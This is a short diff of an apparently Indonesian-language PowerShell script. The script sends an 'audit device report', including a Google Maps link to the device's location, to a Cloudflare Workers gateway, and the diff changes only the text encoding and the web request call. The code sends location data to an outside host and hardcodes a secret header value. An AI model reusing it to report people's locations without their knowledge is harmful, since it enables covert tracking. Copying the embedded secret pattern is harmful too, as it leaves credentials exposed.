@@ -348,18 +348,16 @@ $Message = "📍 *AUDIT DEVICE REPORT*`n" +
            "━━━━━━━━━━━━━━━━━━`n" +
            "🔗 [GMAPS - Device Location]($MapsLink)"
 
-# PAKSA konversi string laporan menjadi Byte Array berbasis UTF-8 murni
-$utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
+# PROSES FIX ENCODING: Paksa konversi internal dari encoding Windows default ke UTF-8 murni
+$ansiBytes = [System.Text.Encoding]::Default.GetBytes($Message)
+$utf8Bytes = [System.Text.Encoding]::Convert([System.Text.Encoding]::Default, [System.Text.Encoding]::UTF8, $ansiBytes)
 
-# Kirim ke Cloudflare Gateway menggunakan header keamanan kustom Anda
+# Kirim ke Cloudflare Gateway menggunakan Invoke-WebRequest seperti biasa
 $urlGateway = "https://win-audit-gateway.addohika.workers.dev"
-$headers = @{
-    "X-Audit-Signature" = "WinAuditS3cretPassw0rd2026"
-}
+$headers = @{ "X-Audit-Signature" = "WinAuditS3cretPassw0rd2026" }
 
 try {
-    # Kirim payload dalam bentuk byte array ($utf8Bytes), bukan string mentah
-    Invoke-RestMethod -Uri $urlGateway -Method Post -Headers $headers -Body $utf8Bytes -ContentType "application/octet-stream"
+    Invoke-WebRequest -Uri $urlGateway -Method Post -Headers $headers -Body $utf8Bytes -ContentType "application/octet-stream" -ErrorAction Stop | Out-Null
 } catch {
     Write-Warning "Gagal mengirim laporan: $_"
 }
